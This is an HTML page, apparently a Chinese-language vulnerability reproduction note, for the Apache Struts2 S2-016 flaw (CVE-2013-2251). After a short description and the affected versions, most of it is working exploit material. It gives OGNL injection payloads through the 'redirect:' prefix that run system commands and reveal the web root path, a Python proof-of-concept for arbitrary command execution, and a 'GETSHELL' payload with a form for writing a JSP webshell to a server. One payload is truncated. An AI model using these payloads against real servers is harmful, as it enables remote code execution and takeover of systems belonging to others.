<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2013-2251s2-016"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2013-2251</span><span class="csECDA2D3">）</span><span class="csDE05BCC">s2-016</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">DefaultActionMapper</span><span class="cs9C1B1871">类支持以</span><span class="cs8926E06">&quot;action:&quot;</span><span class="cs9C1B1871">、</span><span class="cs8926E06">&quot;redirect:&quot;</span><span class="cs9C1B1871">、</span><span class="cs8926E06">&quot;redirectAction:&quot;</span><span class="cs9C1B1871">作为导航或是重定向前缀，但是这些前缀后面同时可以跟</span><span class="cs8926E06">OGNL</span><span class="cs9C1B1871">表达式，由于</span><span class="cs8926E06">struts2</span><span class="cs9C1B1871">没有对这些前缀做过滤，导致利用</span><span class="cs8926E06">OGNL</span><span class="cs9C1B1871">表达式调用</span><span class="cs8926E06">java</span><span class="cs9C1B1871">静态方法执行任意系统命令</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts2.0.0 - Struts2.3.15</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">图片</span><span class="cs8926E06">.png<br/></span><span class="csE3F655E4">任意命令执行</span></p><p class="cs3A447A38"><span class="cs9FB05234">redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</span></p><p class="cs3A447A38"><span class="cs9FB05234">?redirect:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">${#a=new java.lang.ProcessBuilder(new java.lang.String[]{&quot;netstat&quot;,&quot;-an&quot;}).start().getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#screen=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter(),#screen.println(#d),#screen.close()}</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">爆网站路径</span><span class="cs5BEC2C28">EXP</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">python</span><span class="csE3F655E4">执行任意命令</span><span class="cs5BEC2C28">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">import urllib2,sys,re</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def get(url, data):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;string = url + &quot;?&quot; + data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req = urllib2.Request(&quot;%s&quot;%string)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = urllib2.urlopen(req).read().strip()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print strip(response)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def strip(str):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;tmp = str.strip()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;blank_line=re.compile(&#39;\x00&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;tmp=blank_line.sub(&#39;&#39;,tmp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;return tmp</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cmd = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cmd1 = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;attack=&quot;redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{&#39;%s&#39;,&#39;%s&#39;})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}&quot;%(cmd,cmd1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;get(url,attack)</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">GETSHELL EXP</span></p><p class="cs3A447A38"><span class="cs9FB05234">?redirect:${</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\\\&quot;, &quot;/&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后用以下代码写</span><span class="cs8926E06">shell:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;form action=&quot;http://www.0-sec.org/acdap/test.jsp?f=1.jsp&amp;quot; method=&quot;post&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;textarea &gt;code&lt;/textarea&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input type=submit value=&quot;</span><span class="cs7FFD2630">提交</span><span class="cs9FB05234">&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/form&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上传目录生成</span><span class="cs8926E06">1.jsp</span></p></body>
</html>
